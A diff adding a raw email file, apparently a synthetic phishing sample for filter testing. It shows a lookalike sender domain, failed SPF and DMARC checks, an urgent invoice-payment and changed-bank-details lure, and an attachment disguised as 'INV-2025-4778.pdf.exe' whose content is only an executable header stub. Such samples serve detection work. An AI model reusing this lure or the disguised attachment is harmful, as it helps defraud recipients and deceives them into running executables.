@@ -1,0 +1,74 @@
+From: "Zenith Traders Accounts" <billing@Iinkedin-jobs.xyz>
+To: Neha Anderson <neha.anderson@meridian-labs.org>
+Subject: Remittance advice INV-2025-4778 - action required
+Date: Mon, 25 May 2026 13:44:00 +0000
+Message-ID: <178772093961.6.10151183416355354346@Iinkedin-jobs.xyz>
+Return-Path: <bounce-3078@Iinkedin-jobs.xyz>
+MIME-Version: 1.0
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by mx.meridian-labs.org
+ (Postfix) with ESMTPS id FBECB3B48B24 for <recipient@meridian-labs.org>; Mon,
+ 25 May 2026 13:44:00 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by compute-04.cloudprovider.example (Postfix) with ESMTPS id
+ 6B6BAE29D38B; Mon, 25 May 2026 13:37:33 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ edge-2.mailcluster.example (Postfix) with ESMTPS id D59643BD6812; Mon, 25 May
+ 2026 13:35:35 +0000
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mail.gateway.example (Postfix) with ESMTPS id 63161A8E42A2; Mon, 25 May 2026
+ 13:29:14 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=192.0.2.201;
+ envelope-from=<bounce@Iinkedin-jobs.xyz>;
+Authentication-Results: mx.Iinkedin-jobs.xyz; spf=fail
+ smtp.mailfrom=Iinkedin-jobs.xyz; dkim=none header.d=Iinkedin-jobs.xyz;
+ dmarc=fail (p=reject) header.from=Iinkedin-jobs.xyz
+Content-Type: multipart/mixed; boundary="===============8469844525939114499=="
+
+--===============8469844525939114499==
+Content-Type: multipart/alternative;
+ boundary="===============6175032954460341641=="
+
+--===============6175032954460341641==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Neha,
+
+Please find attached invoice INV-2025-4778 for EUR 1,334,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Divya Grant
+Accounts Receivable, Zenith Traders
+
+--===============6175032954460341641==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Neha,</p><p>Please find attached invoice INV-2025-4778 f=
+or EUR 1,334,000, now overdue. Kindly review the attached statement and proce=
+ss this payment immediately to avoid service interruption.</p><p>If the bank =
+details have changed since your last remittance, use the updated account info=
+rmation in the attachment.</p><p>Regards, Divya Grant Accounts Receivable, Ze=
+nith Traders</p></body></html>
+
+--===============6175032954460341641==--
+
+--===============8469844525939114499==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-4778.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============8469844525939114499==--
